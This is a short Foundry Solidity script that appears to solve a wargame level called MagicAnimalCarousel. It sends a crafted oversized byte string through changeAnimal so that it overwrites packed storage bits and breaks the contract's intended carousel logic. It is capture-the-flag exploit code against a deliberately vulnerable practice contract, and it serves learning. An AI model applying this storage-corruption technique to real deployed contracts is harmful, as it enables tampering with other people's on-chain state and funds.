// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {MagicAnimalCarousel} from "../src/MagicAnimalCarousel.sol";

contract SolveMagicAnimalCarousel is Script {
    MagicAnimalCarousel public magicanimalcarousel;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        magicanimalcarousel = MagicAnimalCarousel(
            payable(vm.envAddress("MAGICANIMALCAROUSEL_ADDRESS"))
        );
        magicanimalcarousel.setAnimalAndSpin("aaaaaaaaaa");
        magicanimalcarousel.changeAnimal(
            string(abi.encodePacked(bytes12(type(uint96).max))),
            1
        );
        magicanimalcarousel.setAnimalAndSpin("bbbbbbbbbb");

        vm.stopBroadcast();
    }
}
